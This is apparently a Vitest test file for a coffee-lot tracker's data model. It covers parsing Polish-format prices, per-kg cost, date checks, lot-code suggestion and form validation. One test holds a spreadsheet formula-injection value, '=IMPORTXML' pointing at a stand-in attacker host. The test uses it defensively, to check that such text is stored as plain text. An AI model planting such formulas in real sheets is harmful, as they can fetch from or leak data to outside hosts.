import { describe, expect, it } from 'vitest';
import { SAFETY_COLUMNS } from '../../core/records';
import { columnsOf } from '../../schema';
import {
  FORM_COLUMNS,
  LOTS_TAB,
  LOT_COLUMNS,
  changedFields,
  countryCode,
  emptyLotForm,
  formFromLot,
  greenPricePerKg,
  isDeleted,
  isValidDate,
  lotFromFields,
  priceMissing,
  sortLots,
  suggestCode,
  typedPricePerKg,
  validateLotForm,
  type Lot,
  type LotForm,
} from './model';

const row = (overrides: Record<string, string> = {}): Record<string, string> => ({
  id: 'lot-1',
  code: 'KENYA-26-11',
  name: 'Kenya Kegwa',
  country: 'Kenya',
  region: 'Nyeri',
  altitude: '1700-1900',
  process: 'Washed',
  variety: 'SL28',
  supplier: 'Made-up Importers',
  delivery_date: '2026-11-03',
  quantity_kg: '60',
  coffee_price_net_pln: '4500',
  delivery_cost_net_pln: '120.5',
  notes: 'made-up test lot',
  roastime_container_id: 'c-1',
  roastime_bean_id: 'b-1',
  roastime_supplier_code: 's-1',
  created_at: '2026-11-15T10:00:00.000Z',
  updated_at: '2026-11-15T10:00:00.000Z',
  created_by: 'owner@example.com',
  deleted_at: '',
  ...overrides,
});
const lot = (overrides: Record<string, string> = {}, r = 2): Lot => lotFromFields(row(overrides), r);

const form = (overrides: Partial<LotForm> = {}): LotForm => ({
  code: 'kenya-26-11',
  name: ' Kenya Kegwa ',
  country: 'Kenya',
  region: '',
  altitude: '',
  process: 'Washed',
  variety: '',
  supplier: '',
  deliveryDate: '2026-11-03',
  quantityKg: '60',
  coffeePrice: '4 500,00',
  deliveryCost: '',
  notes: '  keep my spaces  ',
  ...overrides,
});

describe('the Lots columns', () => {
  it('match the Lots tab the migrations create', () => {
    expect([...LOT_COLUMNS, ...SAFETY_COLUMNS].sort()).toEqual(columnsOf(LOTS_TAB).sort());
  });
});

describe('lotFromFields', () => {
  it('reads every field, numbers in grosze and grams', () => {
    expect(lot()).toEqual({
      id: 'lot-1',
      row: 2,
      code: 'KENYA-26-11',
      name: 'Kenya Kegwa',
      country: 'Kenya',
      region: 'Nyeri',
      altitude: '1700-1900',
      process: 'Washed',
      variety: 'SL28',
      supplier: 'Made-up Importers',
      deliveryDate: '2026-11-03',
      quantityGrams: 60000,
      coffeePriceGrosze: 450000,
      deliveryCostGrosze: 12050,
      notes: 'made-up test lot',
      roastime: { containerId: 'c-1', beanId: 'b-1', supplierCode: 's-1' },
      createdAt: '2026-11-15T10:00:00.000Z',
      updatedAt: '2026-11-15T10:00:00.000Z',
      createdBy: 'owner@example.com',
      deletedAt: '',
      problems: [],
      source: row(),
    });
  });

  it('reads numbers typed in the sheet the Polish way', () => {
    expect(lot({ quantity_kg: '59,5', coffee_price_net_pln: '4 500,50' })).toMatchObject({ quantityGrams: 59500, coffeePriceGrosze: 450050 });
  });

  it('keeps a lot with a broken cell and says what is wrong', () => {
    const broken = lot({ quantity_kg: 'sixty', delivery_date: '3.11.2026' }, 7);
    expect(broken.quantityGrams).toBeNull();
    expect(broken.problems).toEqual([
      'Delivery date "3.11.2026" in row 7 is not a date (YYYY-MM-DD).',
      'Quantity "sixty" in row 7 is not a number Kraken can read.',
    ]);
  });

  it('reports a broken price (corrected in the lot form again, owner 2026-11-18)', () => {
    expect(lot({ coffee_price_net_pln: 'about 4500' }, 5).problems).toEqual(['Coffee price "about 4500" in row 5 is not a number Kraken can read.']);
  });

  it('treats empty prices as not entered', () => {
    const imported = lot({ coffee_price_net_pln: '', delivery_cost_net_pln: '' });
    expect(imported.coffeePriceGrosze).toBeNull();
    expect(imported.deliveryCostGrosze).toBeNull();
    expect(priceMissing(imported)).toBe(true);
    expect(priceMissing(lot())).toBe(false);
  });

  it('knows deleted lots', () => {
    expect(isDeleted(lot())).toBe(false);
    expect(isDeleted(lot({ deleted_at: '2026-11-16T09:00:00.000Z' }))).toBe(true);
  });
});

describe('greenPricePerKg', () => {
  it('is (coffee price + delivery cost) ÷ kg, in grosze', () => {
    // (4500.00 + 120.50) / 60 = 77.0083… → 77.01 zł
    expect(greenPricePerKg(lot())).toBe(7701);
  });

  it('treats a missing delivery cost as 0', () => {
    expect(greenPricePerKg(lot({ delivery_cost_net_pln: '' }))).toBe(7500);
  });

  it('works with part kilograms and rounds half up', () => {
    expect(greenPricePerKg({ coffeePriceGrosze: 1000, deliveryCostGrosze: null, quantityGrams: 3000 })).toBe(333); // 3.333…
    expect(greenPricePerKg({ coffeePriceGrosze: 1, deliveryCostGrosze: null, quantityGrams: 2000 })).toBe(1); // 0.5 → 1
  });

  it('is unknown without a price or a quantity', () => {
    expect(greenPricePerKg(lot({ coffee_price_net_pln: '' }))).toBeNull();
    expect(greenPricePerKg(lot({ quantity_kg: '' }))).toBeNull();
    expect(greenPricePerKg(lot({ quantity_kg: '0' }))).toBeNull();
  });
});

describe('isValidDate', () => {
  it.each([
    ['2026-11-03', true],
    ['2028-02-29', true],
    ['2026-02-29', false],
    ['2026-13-01', false],
    ['2026-11-3', false],
    ['03.11.2026', false],
    ['', false],
  ])('%s -> %s', (text, ok) => {
    expect(isValidDate(text)).toBe(ok);
  });
});

describe('suggestCode', () => {
  it('is COUNTRY-YY-MM in capitals', () => {
    expect(suggestCode('Kenya', '2026-11-03', [])).toBe('KENYA-26-11');
  });

  it('turns spaces into dashes and drops accents', () => {
    expect(countryCode('El Salvador')).toBe('EL-SALVADOR');
    expect(countryCode(' Perú ')).toBe('PERU');
    expect(countryCode("Côte d'Ivoire")).toBe('COTE-D-IVOIRE');
    expect(suggestCode('Papua New Guinea', '2027-01-15', [])).toBe('PAPUA-NEW-GUINEA-27-01');
  });

  it('adds -B, -C… for more lots in the same month, counting deleted lots too', () => {
    expect(suggestCode('Kenya', '2026-11-20', ['KENYA-26-11'])).toBe('KENYA-26-11-B');
    expect(suggestCode('Kenya', '2026-11-20', ['kenya-26-11', 'KENYA-26-11-B'])).toBe('KENYA-26-11-C');
  });

  it('keeps going after Z', () => {
    const taken = ['KENYA-26-11', ...Array.from({ length: 25 }, (_, i) => `KENYA-26-11-${String.fromCharCode(66 + i)}`)];
    expect(suggestCode('Kenya', '2026-11-20', taken)).toBe('KENYA-26-11-2');
  });

  it('suggests nothing without a country or a valid date', () => {
    expect(suggestCode('', '2026-11-03', [])).toBe('');
    expect(suggestCode('Kenya', '', [])).toBe('');
    expect(suggestCode('Kenya', '2026-02-30', [])).toBe('');
  });
});

describe('validateLotForm', () => {
  it('accepts a good form and stores normalised values', () => {
    expect(validateLotForm(form(), [])).toEqual({
      ok: true,
      fields: {
        code: 'KENYA-26-11',
        name: 'Kenya Kegwa',
        country: 'Kenya',
        region: '',
        altitude: '',
        process: 'Washed',
        variety: '',
        supplier: '',
        delivery_date: '2026-11-03',
        quantity_kg: '60',
        coffee_price_net_pln: '4500',
        delivery_cost_net_pln: '',
        notes: '  keep my spaces  ',
      },
    });
  });

  it('allows saving without a price (entered later)', () => {
    expect(validateLotForm(form({ coffeePrice: '' }), []).ok).toBe(true);
  });

  it('explains every problem next to its field', () => {
    const result = validateLotForm(
      form({ code: 'kenya/26', name: '', country: ' ', deliveryDate: '2026-02-30', quantityKg: '0', coffeePrice: '-5', deliveryCost: 'abc' }),
      [],
    );
    expect(result).toEqual({
      ok: false,
      errors: {
        code: 'Use only letters A–Z, digits and dashes.',
        name: 'Enter the coffee name.',
        country: 'Enter the country.',
        deliveryDate: 'Use a real date, e.g. 2026-11-03.',
        quantityKg: 'The quantity must be more than 0.',
        coffeePrice: 'Enter an amount, e.g. 4500 or 4500,50 — or leave it empty for now.',
        deliveryCost: 'Enter an amount, e.g. 120 — or leave it empty if there was none.',
      },
    });
  });

  it('requires a code, a date and a quantity', () => {
    const result = validateLotForm(form({ code: '', deliveryDate: '', quantityKg: '' }), []);
    expect(result.ok ? {} : result.errors).toEqual({
      code: 'Enter a code, e.g. KENYA-26-11.',
      deliveryDate: 'Enter the delivery date.',
      quantityKg: 'Enter how many kg were delivered.',
    });
  });

  it('refuses a code another lot has, including a deleted one, in any letter case', () => {
    const deleted = lot({ code: 'KENYA-26-11', deleted_at: '2026-11-16T09:00:00.000Z' });
    const result = validateLotForm(form({ code: 'Kenya-26-11' }), [deleted]);
    expect(result.ok ? '' : result.errors.code).toBe('Another lot already has the code KENYA-26-11.');
  });

  it('turns spaces in the code into dashes', () => {
    const result = validateLotForm(form({ code: 'el salvador 26 11' }), []);
    expect(result.ok && result.fields.code).toBe('EL-SALVADOR-26-11');
  });

  it('limits the length of texts', () => {
    const result = validateLotForm(form({ supplier: 'x'.repeat(201), notes: 'y'.repeat(2001) }), []);
    expect(result.ok ? {} : result.errors).toEqual({ supplier: 'Use at most 200 characters.', notes: 'Use at most 2000 characters.' });
    expect(validateLotForm(form({ supplier: 'x'.repeat(200) }), []).ok).toBe(true);
    const long = validateLotForm(form({ code: 'A'.repeat(41) }), []);
    expect(long.ok ? '' : long.errors.code).toBe('Use at most 40 characters.');
  });

  it('stores a formula-looking text as plain text (Kraken writes RAW, so it never runs)', () => {
    const result = validateLotForm(form({ notes: '=IMPORTXML("http://evil.example")' }), []);
    expect(result.ok && result.fields.notes).toBe('=IMPORTXML("http://evil.example")');
  });
});

describe('editing a lot with an unreadable cell', () => {
  it('shows the cell as typed, so saving never wipes it, and the form check asks to correct it', () => {
    const broken = lot({ coffee_price_net_pln: '4500,555', quantity_kg: 'sixty' });
    const f = formFromLot(broken);
    expect(f.coffeePrice).toBe('4500,555');
    expect(f.quantityKg).toBe('sixty');
    const result = validateLotForm(f, []);
    expect(result.ok ? {} : Object.keys(result.errors)).toEqual(['quantityKg', 'coffeePrice']);
  });
});

describe('changedFields', () => {
  it('returns only the stored values of fields the user changed', () => {
    const original = lot({ code: 'kenya-26-11', name: 'Kenya Kegwa ' }); // typed by hand in the sheet
    const initial = formFromLot(original);
    const edited = { ...initial, supplier: 'New Supplier' };
    const result = validateLotForm(edited, []);
    if (!result.ok) throw new Error('should be valid');
    expect(changedFields(initial, edited, result.fields)).toEqual({ supplier: 'New Supplier' });
  });

  it('stores the tidied value of a changed field', () => {
    const initial = formFromLot(lot());
    const edited = { ...initial, code: 'kenya 26 11 b', coffeePrice: '4 600,00' };
    const result = validateLotForm(edited, []);
    if (!result.ok) throw new Error('should be valid');
    expect(changedFields(initial, edited, result.fields)).toEqual({ code: 'KENYA-26-11-B', coffee_price_net_pln: '4600' });
  });

  it('maps every form field to a Lots column', () => {
    expect(Object.values(FORM_COLUMNS).every((column) => (LOT_COLUMNS as readonly string[]).includes(column))).toBe(true);
  });
});

describe('forms', () => {
  it('a lot opened for editing and saved unchanged stores the same values', () => {
    const original = lot();
    const result = validateLotForm(formFromLot(original), []);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const saved = lotFromFields({ ...row(), ...result.fields }, 2);
    expect({ ...saved, source: {} }).toEqual({ ...original, source: {} });
  });

  it('a new form starts with today as the delivery date', () => {
    expect(emptyLotForm(new Date(2026, 10, 15, 9)).deliveryDate).toBe('2026-11-15');
  });
});

describe('sortLots', () => {
  it('shows the newest delivery first, then by code', () => {
    const lots = [
      lot({ id: 'a', code: 'KENYA-26-09', delivery_date: '2026-09-01' }),
      lot({ id: 'b', code: 'BURUNDI-26-11', delivery_date: '2026-11-03' }),
      lot({ id: 'c', code: 'ALPHA-26-11', delivery_date: '2026-11-03' }),
    ];
    expect(sortLots(lots).map((l) => l.id)).toEqual(['c', 'b', 'a']);
  });
});

describe('the green price per kg while typing', () => {
  it('shows the green price per kg while typing, once price and kg are readable', () => {
    expect(typedPricePerKg({ coffeePrice: '4500', deliveryCost: '120' }, 60000)).toBe(7700);
    expect(typedPricePerKg({ coffeePrice: '4500', deliveryCost: '' }, 60000)).toBe(7500);
    expect(typedPricePerKg({ coffeePrice: '', deliveryCost: '120' }, 60000)).toBeNull();
    expect(typedPricePerKg({ coffeePrice: '4500', deliveryCost: 'abc' }, 60000)).toBeNull();
    expect(typedPricePerKg({ coffeePrice: '4500', deliveryCost: '' }, null)).toBeNull();
    expect(typedPricePerKg({ coffeePrice: '4500', deliveryCost: '' }, 0)).toBeNull();
  });
});
